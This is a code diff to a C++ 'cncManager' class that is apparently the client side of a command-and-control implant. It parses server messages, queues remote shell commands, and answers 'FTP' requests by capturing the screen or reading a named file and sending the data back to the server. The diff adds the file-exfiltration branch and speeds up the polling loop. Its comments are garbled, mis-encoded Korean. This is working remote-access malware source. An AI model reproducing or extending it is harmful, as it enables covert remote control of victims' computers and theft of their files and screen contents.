@@ -172,7 +172,6 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         resData->type = res[1];
         resData->len = *(USHORT *)(res+2);
         resData->seq = *(DWORD *)(res+4);
-        ///* For DEBUG */
 
         if (resData->header != DDPROTO_HEADER)
             std::cout << "Invalid Header !!!" << std::endl;
@@ -182,56 +181,61 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             /* response 勤甸矾 备泅何 */
             switch (resData->type)
             {
-            case error:
-            {
-                this->printParsedResponse(resData, "ERROR");
-                break;
-            }
-                
+                case error:
+                {
+                    this->printParsedResponse(resData, "ERROR");
+                    break;
+                }               
 
-            case beaconResponse:
-            {
-                this->printParsedResponse(resData, "BEACON_RESPONSE");
-                break;
-            }
-                
+                case beaconResponse:
+                {
+                    //this->printParsedResponse(resData, "BEACON_RESPONSE");
+                    break;
+                }                
 
-            case shellRequest:
-            {
-                this->printParsedResponse(resData, "SEHLL_REQUEST");
-                std::istringstream spliter(data);
-                std::string tmp;
-                while (std::getline(spliter, tmp, ';')) {
-                    this->shellCmd.push_back(tmp);
+                case shellRequest:
+                {
+                    this->printParsedResponse(resData, "SEHLL_REQUEST");
+                    std::istringstream spliter(data);
+                    std::string tmp;
+                    while (std::getline(spliter, tmp, ';')) {
+                        this->shellCmd.push_back(tmp);
+                    }
+                    break;
                 }
-                break;
-            }
 
-            case ftpRequest:
-            {
-                this->printParsedResponse(resData, "FTP_REQUEST");
-                if (!data.compare("screenshot")) {
-                    commandManager cmd;
-                    LPVOID ptr = cmd.getScreen();
-                    this->sendData(ftpResponse, cmd.data_len, ptr);
-                    delete[] ptr;
+                case ftpRequest:
+                {
+                 commandManager cmd;
+                 LPVOID ptr = NULL;
+                    /* 胶鸡 夸没 贸府 */
+                    this->printParsedResponse(resData, "FTP_REQUEST");
+                    if (!data.compare("screenshot")) {
+                        ptr = cmd.getScreen();
+                        this->sendData(ftpResponse, cmd.screen_len, ptr);
+                        delete[] ptr;
+                    }
+                    /* 颇老 夸没 贸府 */
+                    else {
+                        ptr = cmd.getFile(data);
+                        this->sendData(ftpResponse, cmd.file_len, ptr);
+                        delete[] ptr;
+                        
+                    }
+                    break;
                 }
-                break;
-
-            }
             
-            case none:
-            {
-                //this->printParsedResponse(resData, "NONE");
-                break;
-            }
+                case none:
+                {
+                    //this->printParsedResponse(resData, "NONE");
+                    break;
+                }
                 
-
-            default:
-            {
-                this->printParsedResponse(resData, "TYPE_ERROR");
-                break;
-            }
+                default:
+                {
+                    this->printParsedResponse(resData, "TYPE_ERROR");
+                    break;
+                }
                 
             }
 
@@ -264,6 +268,6 @@ void cncManager::handleRequest() {
             this->shellCmd.pop_front();
         }
         /* For DEBUG */
-        Sleep(1000);
+        Sleep(300);
     }
 }
